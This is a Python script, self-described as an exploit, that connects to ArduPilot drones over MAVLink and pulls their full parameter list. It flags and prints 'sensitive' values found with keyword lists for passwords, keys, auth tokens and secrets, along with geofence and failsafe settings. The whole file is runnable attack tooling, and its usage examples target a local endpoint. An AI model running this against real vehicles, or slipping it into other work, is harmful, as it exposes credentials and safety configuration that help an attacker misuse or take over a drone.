#!/usr/bin/env python3
"""
Parameter Extraction Exploit Script
Extracts all ArduPilot parameters via MAVLink
"""

import sys
import json
import time
from pathlib import Path
from pymavlink import mavutil

def request_parameter_list(connection):
    """
    Request all parameters from vehicle
    
    Args:
        connection: MAVLink connection object
    
    Returns:
        Dictionary of parameters {name: value}
    """
    print("[*] Requesting parameter list...")
    connection.mav.param_request_list_send(
        connection.target_system,
        connection.target_component
    )
    
    parameters = {}
    timeout = time.time() + 30  # 30 second timeout
    
    print("[*] Collecting parameters...")
    while time.time() < timeout:
        msg = connection.recv_match(type=['PARAM_VALUE'], blocking=True, timeout=2)
        if msg is None:
            # Check if we've received all parameters
            if len(parameters) > 0:
                # Give it a moment for any remaining parameters
                time.sleep(1)
                msg = connection.recv_match(type=['PARAM_VALUE'], blocking=True, timeout=1)
                if msg is None:
                    break
            else:
                break
        
        param_id = msg.param_id.rstrip('\x00')  # Remove null bytes
        param_value = msg.param_value
        
        # Handle different parameter types
        if msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_UINT8:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_INT8:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_UINT16:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_INT16:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_UINT32:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_INT32:
            param_value = int(param_value)
        elif msg.param_type == mavutil.mavlink.MAV_PARAM_TYPE_REAL32:
            param_value = float(param_value)
        
        parameters[param_id] = {
            'value': param_value,
            'type': msg.param_type,
            'index': msg.param_index,
            'count': msg.param_count
        }
        
        if msg.param_index % 50 == 0:
            print(f"[*] Received {msg.param_index + 1}/{msg.param_count} parameters...")
    
    return parameters

def categorize_parameters(parameters):
    """
    Categorize parameters by type/function
    
    Args:
        parameters: Dictionary of parameters
    
    Returns:
        Dictionary of categorized parameters
    """
    categories = {
        'security': [],
        'geofence': [],
        'arming': [],
        'safety': [],
        'flight_control': [],
        'sensors': [],
        'communication': [],
        'other': []
    }
    
    security_keywords = ['PASSWORD', 'KEY', 'AUTH', 'SECRET', 'TOKEN']
    geofence_keywords = ['FENCE', 'GEOFENCE']
    arming_keywords = ['ARM', 'DISARM']
    safety_keywords = ['SAFETY', 'FAILSAFE', 'TERMINATION']
    flight_keywords = ['MODE', 'FLIGHT', 'CONTROL', 'RATE', 'ANGLE']
    sensor_keywords = ['GPS', 'IMU', 'BARO', 'MAG', 'COMPASS']
    comm_keywords = ['MAVLINK', 'RADIO', 'TELEM', 'SERIAL']
    
    for param_name, param_data in parameters.items():
        name_upper = param_name.upper()
        categorized = False
        
        if any(kw in name_upper for kw in security_keywords):
            categories['security'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in geofence_keywords):
            categories['geofence'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in arming_keywords):
            categories['arming'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in safety_keywords):
            categories['safety'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in flight_keywords):
            categories['flight_control'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in sensor_keywords):
            categories['sensors'].append((param_name, param_data))
            categorized = True
        elif any(kw in name_upper for kw in comm_keywords):
            categories['communication'].append((param_name, param_data))
            categorized = True
        
        if not categorized:
            categories['other'].append((param_name, param_data))
    
    return categories

def save_parameters(parameters, output_file, format='json'):
    """
    Save parameters to file
    
    Args:
        parameters: Dictionary of parameters
        output_file: Output file path
        format: Output format ('json' or 'csv')
    """
    output_path = Path(output_file)
    output_path.parent.mkdir(parents=True, exist_ok=True)
    
    if format == 'json':
        # Create categorized output
        categorized = categorize_parameters(parameters)
        
        output_data = {
            'total_parameters': len(parameters),
            'categories': {},
            'all_parameters': {}
        }
        
        for category, params in categorized.items():
            output_data['categories'][category] = {
                'count': len(params),
                'parameters': {name: data['value'] for name, data in params}
            }
        
        # Also include full parameter list
        output_data['all_parameters'] = {
            name: data['value'] for name, data in parameters.items()
        }
        
        with open(output_path, 'w') as f:
            json.dump(output_data, f, indent=2)
        print(f"[+] Parameters saved to {output_path} (JSON)")
    
    elif format == 'csv':
        import csv
        with open(output_path, 'w', newline='') as f:
            writer = csv.DictWriter(f, fieldnames=['parameter_name', 'value', 'type', 'index', 'count'])
            writer.writeheader()
            for name, data in parameters.items():
                writer.writerow({
                    'parameter_name': name,
                    'value': data['value'],
                    'type': data['type'],
                    'index': data['index'],
                    'count': data['count']
                })
        print(f"[+] Parameters saved to {output_path} (CSV)")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 parameter_extraction.py <connection> [output_file] [format]")
        print("Example: python3 parameter_extraction.py udp:127.0.0.1:14550")
        print("Example: python3 parameter_extraction.py udp:127.0.0.1:14550 parameters.json json")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    output_file = sys.argv[2] if len(sys.argv) > 2 else "extracted_parameters.json"
    format_type = sys.argv[3] if len(sys.argv) > 3 else "json"
    
    if format_type not in ['json', 'csv']:
        print("[-] Format must be 'json' or 'csv'")
        sys.exit(1)
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Request and collect parameters
    parameters = request_parameter_list(connection)
    
    if not parameters:
        print("[-] No parameters received")
        sys.exit(1)
    
    print(f"\n[+] Extracted {len(parameters)} parameter(s)")
    
    # Categorize and display sensitive parameters
    categorized = categorize_parameters(parameters)
    
    print("\n[*] Sensitive Parameters Found:")
    if categorized['security']:
        print("  Security:")
        for name, data in categorized['security']:
            print(f"    {name} = {data['value']}")
    
    if categorized['geofence']:
        print("  Geofence:")
        for name, data in categorized['geofence']:
            print(f"    {name} = {data['value']}")
    
    if categorized['safety']:
        print("  Safety:")
        for name, data in categorized['safety']:
            print(f"    {name} = {data['value']}")
    
    # Save parameters
    if format_type == 'csv' and not output_file.endswith('.csv'):
        output_file = output_file.replace('.json', '.csv')
    save_parameters(parameters, output_file, format_type)
    
    print(f"\n[+] Parameter extraction complete")

if __name__ == "__main__":
    main()
